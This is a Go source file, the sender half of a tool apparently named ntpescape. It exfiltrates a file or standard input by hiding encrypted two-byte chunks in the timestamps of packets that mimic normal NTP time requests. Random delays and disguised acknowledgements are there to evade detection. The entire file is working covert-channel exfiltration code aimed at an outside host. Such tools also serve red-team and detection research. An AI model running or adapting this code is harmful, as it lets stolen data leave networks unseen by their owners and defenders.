package send

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"time"

	"github.com/evallen/ntpescape/common"
)

const timeout = 5 * time.Second
const maxTries = 5

var mindelay, maxdelay *int

func Main() {
	dest := flag.String("d", "localhost:123", "dest: host to send the NTP packets to")
	infile := flag.String("f", "-", "file: file to exfiltrate data from ('-' for STDIN)")
	help := flag.Bool("h", false, "help: print this help")
	mindelay = flag.Int("tm", 64, "mindelay: Minimum time (secs. >= 0) between messages sent. 0 = no delay.")
	maxdelay = flag.Int("tM", 1024, "maxdelay: Maximum time (secs. >= mindelay >= 0) between messages sent. 0 = no delay.")
	flag.Parse()

	if *help {
		flag.Usage()
		return
	}

	err := checkDelays(mindelay, maxdelay)
	if err != nil {
		log.Fatalf("Error: %v", err)
	}

	key, err := common.GetKey()
	if err != nil {
		log.Fatalf("Error decoding key: %v", err)
	}

	if *infile == "-" {
		err := sendFromStdin(dest, key[:])
		if err != nil {
			log.Fatalln(err)
		}
		return
	}

	err = sendFromFile(dest, infile, key[:])
	if err != nil {
		log.Fatalln(err)
	}
}

func checkDelays(mindelay, maxdelay *int) error {
	if *mindelay < 0 {
		return fmt.Errorf("mindelay must be 0 or greater")
	}
	if *mindelay > *maxdelay {
		return fmt.Errorf("maxdelay must be greater than or equal to mindelay")
	}
	if *maxdelay < 0 {
		return fmt.Errorf("maxdelay must be 0 or greater")
	}
	return nil
}

// Get a random sending delay between the min. and max. delays.
func getRandomDelay() int {
	return rand.Intn(*maxdelay - *mindelay + 1) + *mindelay
}

// Send data from stdin to the given `dest`. 
func sendFromStdin(dest *string, key []byte) error {
	return sendFromReader(dest, os.Stdin, key)
}

// Send data from a `filepath` to the given `dest`.
func sendFromFile(dest *string, filepath *string, key []byte) error {
	file, err := os.Open(*filepath)
	if err != nil {
		return fmt.Errorf("could not open file: %s", *filepath)
	}

	return sendFromReader(dest, file, key)
}

// Send data from a given reader interface to the given `dest`. 
func sendFromReader(dest *string, rd io.Reader, key []byte) error {
	inbuf := make([]byte, 1024)
	reader := bufio.NewReader(rd)

	for {
		n, err := reader.Read(inbuf)
		if err != nil {
			if err == io.EOF {
				break
			}
			return fmt.Errorf("error reading from %v: %v", rd, err)
		}

		inbuf = inbuf[:n]

		err = reliableSendBuffer(inbuf, dest, key)
		if err != nil {
			return fmt.Errorf("error reliably sending buffer: %v", err)
		}

		inbuf = inbuf[:cap(inbuf)]
	}

	return nil
}

// Reliably send a buffer `buf` of bytes to a `dest`. 
// 
// Splits the `buf` into two-byte message segments
// and reliably sends each one. 
func reliableSendBuffer(buf []byte, dest *string, key []byte) error {
	triesLeft := maxTries

	for i := 0; i < len(buf); {
		if triesLeft <= 0 {
			return fmt.Errorf("could not reliably send buffer")
		}

		var message []byte
		if i == len(buf)-1 {
			message = buf[i:i+1]
		} else {
			message = buf[i:i+2]
		}

		err := sendMessage(message, dest, key)
		if err != nil {
			log.Printf("Retrying message send: %v\n", err)
			triesLeft--
		} else {
			log.Printf("Successfully sent %s\n", message)
			i += 2
			triesLeft = maxTries
		}

		delay := getRandomDelay()
		log.Printf("Waiting %d seconds...\n", delay)
		time.Sleep(time.Duration(delay) * time.Second)
	}

	return nil
}

// Send a 1 or 2-byte `message` to a `dest`. 
//
// This function sends a packet with the `message` 
// and waits for a corresponding ACK response from the 
// server.
func sendMessage(message []byte, dest *string, key []byte) error {
	if len(message) > 2 || len(message) < 1 {
		return fmt.Errorf("invalid message length %v", len(message))
	}

	raddr, err := net.ResolveUDPAddr("udp", *dest)
	if err != nil {
		return fmt.Errorf("failed resolving dest %v: ", err)
	}

	conn, err := net.DialUDP("udp", nil, raddr)
	if err != nil {
		return fmt.Errorf("failed to connect to %v: %v", *dest, err)
	}
	defer conn.Close()

	sentPacket, err := _sendMessage(message, conn, key)
	if err != nil {
		return fmt.Errorf("error sending message: %v", err)
	}

	result, err := waitForAck(sentPacket, conn)
	if err != nil {
		return fmt.Errorf("error waiting for ACK: %v", err)
	}
	
	if !result {
		return fmt.Errorf("invalid ACK received")
	}

	return nil
}

// Send a message packet to the server.
//
// The message packet looks like a normal NTP client request asking for
// the current time, but has the given 1 or 2-byte `message` embedded in
// the bottom two bytes of the transmit timestamp.
//
// The message is encrypted to increase entropy and make it harder to distinguish
// from random noise.
//
// Returns the sent NTP packet (for use in verifying ACK packets later) and any
// error.
func _sendMessage(message []byte, conn *net.UDPConn, key []byte) (*common.NTPPacket, error) {

	if len(message) > 2 || len(message) < 1 {
		return &common.NTPPacket{}, fmt.Errorf("invalid message length %v", len(message))
	}

	packet := common.GenerateClientPkt()
	packet.PatchPacketEncrypted(message, key)

	if err := binary.Write(conn, binary.BigEndian, packet); err != nil {
		return &common.NTPPacket{},
			fmt.Errorf("failed sending packet %v to %v: %v", packet, conn.RemoteAddr(), err)
	}

	return packet, nil
}

// Wait for an ACK packet to come in from the NTP server to acknowledge
// the sent `packet`.
//
// An incoming packet is considered to have ACK'ed a previously transmitted
// `packet` if the incoming origin timestamp matches the transmit timestamp
// of the sent packet.
//
// This is standard for server responses to NTP client requests, and provides
// a convenient (and stealthy) way for us to know if the receiver got our message.
//
// Returns `result` = True if an ACK was sucessfully received, or False if not.
func waitForAck(packet *common.NTPPacket, conn *net.UDPConn) (result bool, err error) {
	// Read packet
	b := make([]byte, 512)
	conn.SetReadDeadline(time.Now().Add(timeout))
	_, _, err = conn.ReadFromUDP(b)
	if err != nil {
		return false, fmt.Errorf("failed reading ACK from UDP: %v", err)
	}

	// Put into struct
	var response common.NTPPacket
	err = binary.Read(bytes.NewBuffer(b), binary.BigEndian, &response)
	if err != nil {
		return false, fmt.Errorf("failed reading ACK packet: %v", err)
	}

	// See if it's a valid ACK
	if response.OrigTimeSec == packet.TxTimeSec &&
		response.OrigTimeFrac == packet.TxTimeFrac {
		return true, nil
	}

	return false, nil
}
